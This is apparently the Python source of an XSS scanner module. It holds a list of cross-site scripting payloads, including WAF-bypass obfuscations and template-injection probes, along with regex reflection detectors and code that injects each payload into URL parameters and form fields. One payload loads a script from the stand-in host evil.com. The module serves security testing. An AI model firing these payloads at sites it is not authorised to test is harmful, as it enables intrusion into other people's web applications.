from __future__ import annotations

import re
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from typing import Any

import httpx
from bs4 import BeautifulSoup


PAYLOADS = [
    # --- Classic script injection ---
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '</script><script>alert(1)</script>',

    # --- img tag ---
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "<img src/onerror=alert(1)>",

    # --- svg ---
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><animate onend=alert(1) attributeName=x dur=1s>',

    # --- CSS animation events (auto-fire, no user interaction) ---
    '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>',
    '<style>@keyframes slidein{}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>',

    # --- body events (auto-fire) ---
    '<body onload=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<body onhashchange=print()>',
    '<body onpopstate=print()>',
    '<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>',

    # --- autofocus / focus events ---
    '<xss onfocus=alert(1) autofocus tabindex=1>',
    '<a id=x tabindex=1 onfocus=alert(1)></a>',

    # --- details / toggle (auto-fire with open attribute) ---
    '<details ontoggle=alert(1) open>test</details>',

    # --- content-visibility (Chrome, auto-fire) ---
    '<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>',

    # --- hidden until found (Chrome) ---
    '<xss id=x onbeforematch=alert(1) hidden=until-found>',

    # --- popover (Chrome) ---
    '<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>',

    # --- audio / video (auto-fire with valid-ish source) ---
    '<audio onloadeddata=alert(1)><source src=x type=audio/wav></audio>',
    '<video oncanplaythrough=alert(1)><source src=x type=video/mp4></video>',

    # --- javascript: URI ---
    'javascript:alert(1)',
    '"><a href=javascript:alert(1)>click</a>',

    # --- WebKit-specific ---
    '<xss onwebkitanimationend=alert(1) style="animation:x 1s" class=x>',

    # --- WAF bypass / obfuscation ---
    '<ScRiPt>alert(1)</ScRiPt>',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
    '<<script>alert(1)//<</script>',
    '<script/src=//evil.com/x.js>',

    # --- Template injection probe (Jinja2 / Angular / Vue) ---
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
]

REFLECTION_PATTERNS = [
    # script tag with alert
    re.compile(r'<script[^>]*>.*?alert\s*\(', re.IGNORECASE | re.DOTALL),
    # any event handler containing alert/print
    re.compile(r'on\w+\s*=\s*["\']?\s*(alert|print|console\.log)\s*\(', re.IGNORECASE),
    # svg/animate onbegin or onend
    re.compile(r'<svg[^>]*>.*?on(begin|end|load)\s*=', re.IGNORECASE | re.DOTALL),
    # img onerror
    re.compile(r'<img[^>]+onerror\s*=', re.IGNORECASE),
    # javascript: URI
    re.compile(r'javascript\s*:\s*(alert|print)\s*\(', re.IGNORECASE),
    # CSS animation event handlers
    re.compile(r'onanimation(end|start|iteration|cancel)\s*=', re.IGNORECASE),
    # content-visibility / hidden-until-found / popover triggers
    re.compile(r'oncontentvisibilityautostatechange\s*=', re.IGNORECASE),
    re.compile(r'onbeforematch\s*=', re.IGNORECASE),
    re.compile(r'onbeforetoggle\s*=', re.IGNORECASE),
    # audio/video media events
    re.compile(r'on(loadeddata|canplaythrough|durationchange|loadedmetadata)\s*=', re.IGNORECASE),
    # WebKit events
    re.compile(r'onwebkit\w+\s*=', re.IGNORECASE),
    # template injection: output of 7*7 = 49 in response
    re.compile(r'(?<!\d)49(?!\d)'),
]


class XSSScanner:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": "WVS-XSSScanner/1.0"},
        )

    def _is_reflected(self, response_text: str, payload: str) -> bool:
        # Template injection: check if the expression was evaluated (49, not just echoed)
        if payload in ('{{7*7}}', '${7*7}', '<%= 7*7 %>'):
            import re
            return bool(re.search(r'(?<!\d)49(?!\d)', response_text))

        if payload in response_text:
            for pattern in REFLECTION_PATTERNS:
                if pattern.search(response_text):
                    return True
        return False

    def _check_csp(self, headers: dict) -> bool:
        csp = headers.get("content-security-policy", "")
        return bool(csp and "unsafe-inline" not in csp.lower())

    def _extract_forms(self, html: str, base_url: str) -> list[dict]:
        soup = BeautifulSoup(html, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "get").lower()
            action_url = urljoin(base_url, action) if action else base_url
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name:
                    inputs.append({"name": name, "type": inp.get("type", "text")})
            forms.append({"action": action_url, "method": method, "inputs": inputs})
        return forms

    def _test_url_params(self, url: str) -> list[dict]:
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return findings

        for param_name in params:
            for payload in PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                try:
                    resp = self.client.get(test_url)
                    if self._is_reflected(resp.text, payload):
                        findings.append({
                            "type": "Reflected XSS",
                            "vector": "URL parameter",
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "severity": "High",
                            "csp_protected": self._check_csp(dict(resp.headers)),
                        })
                        break  # One confirmed finding per param is enough
                except Exception:
                    continue
        return findings

    def _test_forms(self, forms: list[dict]) -> list[dict]:
        findings = []
        for form in forms:
            for inp in form["inputs"]:
                if inp["type"] in ("hidden", "submit", "button", "image", "file"):
                    continue
                for payload in PAYLOADS:
                    data = {i["name"]: payload if i["name"] == inp["name"] else "test"
                            for i in form["inputs"]}
                    try:
                        if form["method"] == "post":
                            resp = self.client.post(form["action"], data=data)
                        else:
                            resp = self.client.get(form["action"], params=data)
                        if self._is_reflected(resp.text, payload):
                            findings.append({
                                "type": "Reflected XSS",
                                "vector": f"Form field ({form['method'].upper()})",
                                "parameter": inp["name"],
                                "payload": payload,
                                "url": form["action"],
                                "severity": "High",
                                "csp_protected": self._check_csp(dict(resp.headers)),
                            })
                            break
                    except Exception:
                        continue
        return findings

    def scan(self, url: str) -> dict[str, Any]:
        result: dict[str, Any] = {
            "status": "ok",
            "url": url,
            "issues": [],
            "score": 100,
        }

        try:
            resp = self.client.get(url)
        except Exception as exc:
            return {"status": "error", "url": url, "issues": [{"name": "XSS scan failed", "evidence": str(exc), "severity": "Medium"}], "score": 0}

        headers = {k.lower(): v for k, v in resp.headers.items()}
        has_csp = self._check_csp(headers)

        if not has_csp:
            result["issues"].append({
                "name": "No Content-Security-Policy",
                "severity": "Medium",
                "evidence": "Missing CSP header makes XSS easier to exploit.",
            })

        url_findings = self._test_url_params(url)
        form_findings = self._test_forms(self._extract_forms(resp.text, url))
        all_findings = url_findings + form_findings

        result["issues"].extend(all_findings)
        result["reflected_xss_count"] = len(all_findings)
        result["csp_present"] = has_csp
        result["score"] = max(0, 100 - (len(result["issues"]) * 20))
        result["status"] = "issues_found" if result["issues"] else "ok"
        return result

    def close(self):
        self.client.close()

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.close()
